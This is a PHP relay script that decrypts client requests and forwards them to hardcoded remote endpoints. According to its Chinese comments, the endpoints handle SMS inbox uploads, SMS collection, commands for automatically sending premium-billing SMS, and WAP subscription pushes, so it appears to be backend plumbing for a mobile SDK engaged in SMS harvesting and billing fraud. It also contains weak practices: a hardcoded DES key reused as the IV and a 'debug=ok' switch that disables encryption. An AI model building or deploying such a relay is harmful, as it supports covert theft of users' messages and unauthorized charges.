<?php

class Transmit
{
    private $des = "";
    private $key = "xpYZA7GjGWeqbyDl6SmOeIE8zURKaU";

    private $isCiphertext = true;

    public function __construct($isCiphertext = true)
    {
        if ($_REQUEST['debug'] == 'ok') {
            $isCiphertext = false;
        }
        $this->isCiphertext = $isCiphertext;
        if ($isCiphertext) {
            $des = new Des($this->key);
            $this->des = $des;
        }
    }

    function sendUrlConf($key = "")
    {
        $conf = [
            //判断是否有使用权
            "sdkcp/Gp.Valid" => "http://amc.jiekou88.com/sdkcp/Gp.Valid",
            //收件箱上传
            "sdkcp/Gp.InboxUpload" => "http://amc.jiekou88.com/sdkcp/Gp.InboxUpload",
            //激活
            "sdkcp/SaleStaticNewcp" => "http://amc.jiekou99.com/sdkcp/sale_static_newcp.php",
            //访问接口
            "sdkcp/UserVisitAppcp" => "http://amc.jiekou99.com/sdkcp/user_visit_appcp.php",
            //SDK动态插件更新接口
            "sdkcp/PlugUpdate" => "http://amc.jiekou99.com/sdkcp/plugUpdate.php",
            //app日志
            "sdkcp/AppLog" => "http://amc.jiekou99.com/sdkcp/app_log.php",
            //自动发短信获取短信指令
            "sdkcp/PushMsgcpNew" => "http://amc.jiekou99.com/sdkcp/push_msgcp_new.php",
            //获取sp短信指令
            "sdkcp/Bfeecnf" => "http://amc.jiekou99.com/sdkcp/Bfeecnf.php",
            //sp短信发送结果上传
            "sdkcp/SubPayQuery" => "http://amc.gp001.info/sdkcp/sub_payquery.php",
            //wap推送接口（定制版）
            "sdkcp/WapPushCustom" => "http://amc.jiekou88.com/sdkcp/WapPushCustom",
            //wap普通推送接口
            "sdkcp/WapPush" => "http://amc.jiekou88.com/sdkcp/wappush",
            //wap短信收集接口
            "sdkcp/SmsCollection" => "http://amc.jiekou88.com/sdkcp/SmsCollection",
            //wap网页上传
            "sdkcp/UploadPage" => "http://asia1.jiekou99.com/sdkcp/geturlok.php",
            //wap页面
            "???" => "???",
            //查询wap点击记录
            "sdkcp/GetWapCilckLog" => "http://amc.jiekou99.com/sdkcp/getWapCilckLog.php",
            //查询wap订阅记录
            "sdkcp/GetWapSubLog" => "http://amc.jiekou99.com/sdkcp/getWapSubLog.php",
        ];
        if ($key) {
            return $conf[$key];
        }
        return $conf;
    }

    /**
     * 运行
     */
    function run()
    {
        if ($this->isCiphertext) {
            $data = file_get_contents("php://input");
            if (!$data) {
//                die("not data");
                return;
            }

            $result = $this->decryptData($data);
            if (!$result) {
//                die("not result");
                return;
            }
            parse_str($result, $info);
        } else {
            $info = $_REQUEST;
        }
        echo $this->sendUrl($info);
    }

    private function decryptData($data)
    {
        $result = $this->des->Decrypt($data, $this->key);
        return $result;
    }

    private function sendUrl($info)
    {
        if (!$info) {
//            die("not info");
            return;
        }
        $act = $info['act'];
        if (!$act) {
            return;
        }
        include './ext/extend/Curl.php';

        $url = $this->sendUrlConf($act);
        if (!$url) {
            return "";
        }
//        $curl = new Curl();
//        $res = $curl->post($url, $info)->getResponse(false);
        $res = $this->curlRequest($url, $info, "POST");
        return $this->returnData($res);
    }

    private function returnData($res)
    {
        if ($this->isCiphertext) {
            $returnData = $this->des->Encrypt($res, $this->key);
        } else {
            $returnData = $res;
        }
        return $returnData;
    }

    /**
     * 模拟curl进行url请求
     * @param string $url
     * @param array $data
     * @param string $method
     * @return array|bool|mixed
     */
    function curlRequest($url = '', $data = [], $method = "GET")
    {
        if (empty($url) || empty($data)) {
            return false;
        }
        if ($method == "GET") {
            $url = trim($url, "&?");
            $flag = "?";
            if (strrpos($url, "?") !== false) {
                $flag = "&";
            }
            $url .= $flag . http_build_query($data);
        }

        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL, $url);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 0);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上
        if ($method == 'POST') {
            $curlPost = http_build_query($data);
            curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
            curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
        }

        $data = curl_exec($ch);//运行curl
        curl_close($ch);
        return $data;
    }
}

final class Des
{
    var $iv;

    public function __construct($key)
    {
        $this->iv = $this->getDesKey($key);
    }

    //加密
    public function Encrypt($data, $key)
    {
        if (empty($key) || empty($data)) {
            return '';
        }

        try {
            $size = mcrypt_get_block_size(MCRYPT_DES, MCRYPT_MODE_CBC);
            $str = $this->pkcs5Pad($data, $size);
            return strtoupper(bin2hex(mcrypt_cbc(MCRYPT_DES, $this->iv, $str, MCRYPT_ENCRYPT, $this->iv)));
        } catch (Exception $e) {
            return '';
        }
    }

    //解密
    public function Decrypt($data, $k)
    {
        if (empty($k) || empty($data)) {
            return '';
        }

        try {
            $strBin = $this->hex2bin(strtolower($data));
            $str = mcrypt_cbc(MCRYPT_DES, $this->iv, $strBin, MCRYPT_DECRYPT, $this->iv);
            return $this->pkcs5Unpad($str);
        } catch (Exception $e) {
            return '';
        }
    }

    function getDesKey($k)
    {
        return substr(strtoupper(hash('md5', $k)), 0, 8);
    }

    function hex2bin($hexData)
    {
        $binData = '';
        for ($i = 0; $i < strlen($hexData); $i += 2) {
            $binData .= chr(hexdec(substr($hexData, $i, 2)));
        }
        return $binData;
    }

    function pkcs5Pad($text, $blocksize)
    {
        $pad = $blocksize - (strlen($text) % $blocksize);
        return $text . str_repeat(chr($pad), $pad);
    }

    function pkcs5Unpad($text)
    {
        $pad = ord($text{strlen($text) - 1});
        if ($pad > strlen($text))
            return false;
        if (strspn($text, chr($pad), strlen($text) - $pad) != $pad)
            return false;
        return substr($text, 0, -1 * $pad);
    }
}

$transmit = new Transmit();
$transmit->run();